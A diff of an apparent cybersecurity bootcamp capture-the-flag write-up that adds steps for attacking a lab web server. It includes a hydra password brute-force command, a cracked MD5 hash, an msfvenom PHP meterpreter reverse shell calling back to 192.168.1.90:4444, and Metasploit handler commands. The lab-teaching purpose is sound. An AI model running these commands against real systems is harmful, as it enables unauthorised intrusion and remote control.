@@ -103,14 +103,16 @@ Complete the following to find the flag:
 - Brute force the password for the hidden directory using the hydra command:
 > 
 > Command: `hydra -l ashton -P ~/Downloads/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
+> 
 > ![hydra](images/hydra(20).JPG)
+> 
 > After gaining access to the `/secret_folder` using `ashton` & `leopoldo` I was able to view a file which contained the log in information required to access the `WebDav`.
 >
 > ![secret_folder_info](images/secret_folder_connect_to_corp_server.JPG)
 
 
 - Break the hashed password with the Crack Station website or John the Ripper.
->
+
 > Ryan's hash: `d7dad0a5cd7c8376eeb50d69b3ccd352`
 > 
 > ![hash_decrypt](images/ryan_hash_decrypt.JPG)
@@ -123,19 +125,74 @@ Complete the following to find the flag:
 > ![webdav_login](images/ryan_webdav_login.JPG)
 >
 > Once inside the parent directory, I accessed the file named `passwd.dav` which contained this:
+> 
 > ![ryan_password](images/ryan_password.JPG)
-
-
-
+>
+> Afterwards, I used a built in program `Kali File Manager` to be able to place a reverse shell script into the `WebDav` server in the next section. 
+>
+> ![filemanager](images/accessto_webdav.JPG)
 
 - Upload a PHP reverse shell payload.
-    - **Hint**: Try using your scripting skills! MSVenom may also be helpful.
+>
+> Command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 > reverseshell.php`
+> 
+> ![msfvenom_shell](images/msfvenom_shell.JPG)
+> 
+> The `reverseshell.php` contained the following:
+> 
+> ![shell_script](images/reverseshell_script.JPG)
+> 
+> I then placed the script into the `WebDav` server using `Kali File Manager`, and checked for it on the website. 
+> 
+> ![payload_delivered](images/payload_delivered.JPG)
+> 
+> ![firefox_shell](images/firefox_shell.JPG)
+
 - Execute payload that you uploaded to the site to open up a meterpreter session.
+
+> First I started `Metasploit` using the command: `msfconsole`
+> 
+> ![msfconsole](images/msfconsole_mf5.JPG)
+> 
+> I then needed to `search` and select the type of exploit to use, this this case it would be `multi/handler`. 
+> 
+> ![payload_handler](images/payload_handler.JPG)
+> 
+> The next step is to select the correct one which is option `6`.
+> 
+> ![use6](images/use6.JPG)
+> 
+> Now that I've selected my exploit I needed to designate and set a `payload`.
+> 
+> Command: `set Payload php/meterpreter/reverse_tcp`
+> 
+> ![msfpayloaddesignation](images/msf_payload_designation.JPG)
+> 
+> Now it is time to set the `LHOST` & `LPORT`.
+> 
+> Command: `set LHOST 192.168.1.90` & `set LPORT 4444`
+> 
+> ![lhost_lport_msf](images/lhost_lport_msf.JPG)
+> 
+> Finally, it is time to `exploit` and establish a meterpreter session. 
+> 
+> ![exploit](images/meterpreter_established.JPG)
+
 - Find and capture the flag.
 
-After you have captured the flag, show it to your instructor.
-
-Be sure to save important files (e.g., scan results) and take screenshots as you work through the assessment. You'll use them again when creating your presentation.
+> Command: `pwd`
+> 
+>![pwd_webdav](images/pwd_webdav.JPG)
+>
+> Next I wanted to change directories to see what else was stored on the `WebDav` machine.
+> 
+> Command: `cd /` followed by `ls`
+> 
+> ![flag_found](images/flag_found.JPG)
+> 
+> The `ls` command displayed a file named `flag.txt`. I then used `cat` to view the contents of that file which was:
+> 
+> ![flag_captured](images/flag_captured.JPG)
 
 ---
 © 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
